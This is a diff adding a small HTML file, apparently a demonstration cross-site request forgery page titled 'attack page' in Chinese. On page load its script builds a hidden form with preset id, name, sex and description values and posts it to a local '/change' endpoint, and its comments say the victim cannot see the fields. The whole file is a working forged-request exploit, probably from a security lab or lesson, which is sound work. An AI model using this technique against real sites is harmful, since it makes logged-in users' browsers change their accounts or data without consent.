@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>攻击页面</title>
+</head>
+<body>
+  <h1>这是一个攻击页面</h1>
+</body>
+  <script>
+    function hack() {
+      var fields;
+      // The following are form entries that need to be filled out
+      // by attackers. The entries are made hidden, so the victim
+      // won't be able to see them.
+      fields += "<input name='id' type='hidden' value='id_1111'/>";
+      fields += "<input type='hidden' name='name' value='testName'>";
+      fields += "<input type='hidden' name='sex' value='testSex'>";
+      fields += "<input type='hidden' name='desc' value='testDesc'>";
+      
+      var url = "http://localhost:3001/change";
+      var p = document.createElement("form");
+      //construct the form
+      p.action = url;
+      p.innerHTML = fields;
+      p.target = "_self";
+      p.method = "post";
+
+      //append the form to the current page.
+      document.body.appendChild(p);
+      //submit the form
+      p.submit();
+    }
+    window.onload = function() {
+      hack();
+    }
+  </script>
+</html>
